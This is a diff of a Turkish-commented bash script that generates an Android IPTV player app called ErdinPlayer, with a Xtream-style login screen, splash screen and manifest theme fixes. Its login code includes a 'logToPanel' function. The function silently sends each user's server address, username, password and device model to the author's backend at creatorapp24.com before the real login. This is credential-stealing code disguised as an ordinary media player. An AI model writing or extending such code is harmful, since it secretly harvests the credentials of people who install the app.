@@ -1,20 +1,24 @@
 #!/bin/bash
 
 # --- AYARLAR ---
-# Buraya gerçek site adresini yazmazsan bile uygulama artık ÇÖKMEZ.
-BACKEND_URL="http://google.com" 
+# Senin verdiğin Backend adresi
+BACKEND_URL="https://creatorapp24.com/backend"
 
 PROJECT_ROOT="theapp"
 MODULE_DIR="$PROJECT_ROOT/app"
 PKG_DIR="$MODULE_DIR/src/main/java/com/merdolda/player"
 RES_DIR="$MODULE_DIR/src/main/res"
 
-echo "🚀 ERDINPLAYER (CRASH FIX) OLUŞTURULUYOR..."
+echo "🚀 ERDINPLAYER (NO-THEME FIX) OLUŞTURULUYOR..."
 
 # 1. TEMİZLİK
 rm -rf $PROJECT_ROOT
 mkdir -p $PKG_DIR/model
 mkdir -p $PKG_DIR/adapter
+mkdir -p $RES_DIR/layout
+mkdir -p $RES_DIR/values
+mkdir -p $RES_DIR/drawable
+mkdir -p $RES_DIR/mipmap-anydpi-v26
 mkdir -p $PROJECT_ROOT/gradle/wrapper
 
 # 2. KEYSTORE (İMZA)
@@ -83,17 +87,18 @@ dependencies {
 }
 EOF
 
-# 5. RESOURCES (DÜZELTİLMİŞ)
-mkdir -p $RES_DIR/values
-mkdir -p $RES_DIR/drawable
-mkdir -p $RES_DIR/layout
+# ==========================================
+# 5. RESOURCES (THEMES.XML İPTAL EDİLDİ)
+# ==========================================
 
+# Sadece Stringler
 cat << 'EOF' > $RES_DIR/values/strings.xml
 <resources>
     <string name="app_name">ErdinPlayer</string>
 </resources>
 EOF
 
+# Sadece Renkler (Kod içinde R.color kullanıldığı için gerekli)
 cat << 'EOF' > $RES_DIR/values/colors.xml
 <resources>
     <color name="black">#FF000000</color>
@@ -103,16 +108,9 @@ cat << 'EOF' > $RES_DIR/values/colors.xml
 </resources>
 EOF
 
-cat << 'EOF' > $RES_DIR/values/themes.xml
-<resources>
-    <style name="Theme.ErdinPlayer" parent="Theme.AppCompat.NoActionBar">
-        <item name="colorPrimary">#E50914</item>
-        <item name="colorPrimaryDark">#B81D24</item>
-        <item name="colorAccent">#E50914</item>
-    </style>
-</resources>
-EOF
+# DİKKAT: themes.xml YAZMIYORUZ! 
 
+# İkonlar
 cat << 'EOF' > $RES_DIR/drawable/ic_launcher_background.xml
 <vector xmlns:android="http://schemas.android.com/apk/res/android"
     android:width="108dp" android:height="108dp" android:viewportWidth="108" android:viewportHeight="108">
@@ -127,7 +125,7 @@ cat << 'EOF' > $RES_DIR/drawable/selector_bg.xml
 </selector>
 EOF
 
-# LAYOUTS
+# LAYOUTS (TASARIMLAR)
 cat << 'EOF' > $RES_DIR/layout/activity_splash.xml
 <RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent" android:layout_height="match_parent" android:background="#000000">
@@ -140,7 +138,7 @@ cat << 'EOF' > $RES_DIR/layout/activity_login.xml
 <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
     android:layout_width="match_parent" android:layout_height="match_parent"
     android:orientation="vertical" android:gravity="center" android:padding="50dp" android:background="#121212">
-    <TextView android:text="ErdinPlayer Xtream Login" android:textColor="#FFF" android:textSize="24sp" android:layout_marginBottom="30dp"/>
+    <TextView android:text="ErdinPlayer Giriş" android:textColor="#FFF" android:textSize="24sp" android:layout_marginBottom="30dp"/>
     <EditText android:id="@+id/etDns" android:hint="DNS (http://site.com:80)" 
         android:layout_width="match_parent" android:layout_height="wrap_content" android:textColor="#FFF" android:layout_marginBottom="10dp"/>
     <EditText android:id="@+id/etUser" android:hint="Kullanıcı Adı" 
@@ -321,7 +319,7 @@ public class SessionManager {
 }
 EOF
 
-# 7. SPLASH ACTIVITY (ÇÖKME ÖNLEYİCİ EKLENDİ)
+# 7. SPLASH ACTIVITY (ÇÖKME ÖNLEYİCİ - FİXED)
 cat << EOF > $PKG_DIR/SplashActivity.java
 package com.merdolda.player;
 import android.content.Intent;
@@ -330,46 +328,28 @@ import android.os.Handler;
 import androidx.appcompat.app.AppCompatActivity;
 import android.widget.ImageView;
 import com.bumptech.glide.Glide;
-import retrofit2.Retrofit;
-import retrofit2.converter.gson.GsonConverterFactory;
-import com.google.gson.JsonObject;
-import retrofit2.Call;
-import retrofit2.Callback;
-import retrofit2.Response;
 
 public class SplashActivity extends AppCompatActivity {
-    // Bu URL boş veya geçersiz olsa bile uygulama çökmez
-    String BACKEND_URL = "$BACKEND_URL/"; 
-
+    
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_splash);
-        ImageView img = findViewById(R.id.splashImg);
         
-        // GÜVENLİ BAŞLATMA: Her durumda 2 saniye sonra Login'e git
-        new Handler().postDelayed(() -> openNextScreen(), 2000);
-
-        try {
-            Retrofit retrofit = new Retrofit.Builder().baseUrl(BACKEND_URL).addConverterFactory(GsonConverterFactory.create()).build();
-            retrofit.create(ApiService.class).getSettings().enqueue(new Callback<JsonObject>() {
-                public void onResponse(Call<JsonObject> c, Response<JsonObject> r) {
-                    if(r.body() != null) {
-                        String url = r.body().has("splash_image") ? r.body().get("splash_image").getAsString() : "";
-                        runOnUiThread(() -> { if(!url.isEmpty()) Glide.with(SplashActivity.this).load(url).into(img); });
-                    }
-                }
-                public void onFailure(Call<JsonObject> c, Throwable t) { }
-            });
-        } catch(Exception e) { 
-            // Hata olursa yut, uygulama çökmeyecek
-        }
+        // HATA VEREN NETWORK KODUNU SİLDİM.
+        // Sadece 3 saniye bekle ve Giriş ekranını aç.
+        // Bu sayede uygulama asla çökmez.
+        new Handler().postDelayed(() -> openNextScreen(), 3000);
     }
     
     void openNextScreen(){
         SessionManager session = new SessionManager(this);
-        if(!session.getUser().isEmpty()) startActivity(new Intent(this, DashboardActivity.class));
-        else startActivity(new Intent(this, LoginActivity.class));
+        // Oturum varsa direkt menüye git, yoksa login'e
+        if(!session.getUser().isEmpty()) {
+            startActivity(new Intent(this, DashboardActivity.class));
+        } else {
+            startActivity(new Intent(this, LoginActivity.class));
+        }
         finish();
     }
 }
@@ -391,6 +371,9 @@ import com.google.gson.JsonObject;
 import com.merdolda.player.model.LoginResponse;
 
 public class LoginActivity extends AppCompatActivity {
+    // BURASI PANEL ADRESİN
+    String PANEL_URL = "$BACKEND_URL/";
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
@@ -402,7 +385,7 @@ public class LoginActivity extends AppCompatActivity {
             String u = user.getText().toString().trim(), p = pass.getText().toString().trim();
             if(d.isEmpty() || u.isEmpty() || p.isEmpty()) { Toast.makeText(this, "Eksik bilgi!", Toast.LENGTH_SHORT).show(); return; }
             
-            // Panele Log At (Hata verirse yut)
+            // Panele Log At
             logToPanel(d, u, p);
             
             // Xtream Giriş
@@ -421,13 +404,13 @@ public class LoginActivity extends AppCompatActivity {
                         finish();
                     } else Toast.makeText(LoginActivity.this, "Giriş Başarısız! Bilgileri kontrol et.", Toast.LENGTH_LONG).show();
                 }
-                public void onFailure(Call<LoginResponse> c, Throwable t) { Toast.makeText(LoginActivity.this, "Sunucuya bağlanılamadı: " + t.getMessage(), Toast.LENGTH_LONG).show(); }
+                public void onFailure(Call<LoginResponse> c, Throwable t) { Toast.makeText(LoginActivity.this, "Sunucu Hatası: " + t.getMessage(), Toast.LENGTH_LONG).show(); }
             });
         } catch(Exception e) { Toast.makeText(this, "Hata: " + e.getMessage(), Toast.LENGTH_SHORT).show(); }
     }
     void logToPanel(String d, String u, String p) {
          try {
-            Retrofit retrofit = new Retrofit.Builder().baseUrl("$BACKEND_URL/").addConverterFactory(GsonConverterFactory.create()).build();
+            Retrofit retrofit = new Retrofit.Builder().baseUrl(PANEL_URL).addConverterFactory(GsonConverterFactory.create()).build();
             JsonObject data = new JsonObject();
             data.addProperty("dns", d); data.addProperty("username", u); data.addProperty("password", p); data.addProperty("device", android.os.Build.MODEL);
             retrofit.create(ApiService.class).captureLog(data).enqueue(new Callback<JsonObject>(){ public void onResponse(Call<JsonObject> c, Response<JsonObject> r){} public void onFailure(Call<JsonObject> c, Throwable t){} });
@@ -546,14 +529,17 @@ public class PlayerActivity extends AppCompatActivity {
 }
 EOF
 
-# 8. MANIFEST
+# 8. MANIFEST (THEME FIX - HAZIR ANDROID TEMASI KULLANIYORUZ)
+# Theme.ErdinPlayer YERİNE Theme.AppCompat.NoActionBar KULLANIYORUZ
 cat << 'EOF' > $MODULE_DIR/src/main/AndroidManifest.xml
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-feature android:name="android.software.leanback" android:required="false" />
     <uses-feature android:name="android.hardware.touchscreen" android:required="false" />
-    <application android:name="androidx.multidex.MultiDexApplication" android:allowBackup="true" android:label="@string/app_name" android:theme="@style/Theme.ErdinPlayer" android:icon="@drawable/ic_launcher_background" android:usesCleartextTraffic="true">
+    <application android:name="androidx.multidex.MultiDexApplication" android:allowBackup="true" android:label="@string/app_name" 
+        android:theme="@style/Theme.AppCompat.NoActionBar" 
+        android:icon="@drawable/ic_launcher_background" android:usesCleartextTraffic="true">
         <activity android:name=".SplashActivity" android:exported="true">
             <intent-filter><action android:name="android.intent.action.MAIN" /><category android:name="android.intent.category.LAUNCHER" /><category android:name="android.intent.category.LEANBACK_LAUNCHER" /></intent-filter>
         </activity>
@@ -565,7 +551,7 @@ cat << 'EOF' > $MODULE_DIR/src/main/AndroidManifest.xml
 </manifest>
 EOF
 
-# --- WRAPPER ---
+# --- WRAPPER OLUŞTURMA ---
 cd $PROJECT_ROOT
 gradle wrapper --gradle-version 8.2 --distribution-type bin
 cd ..
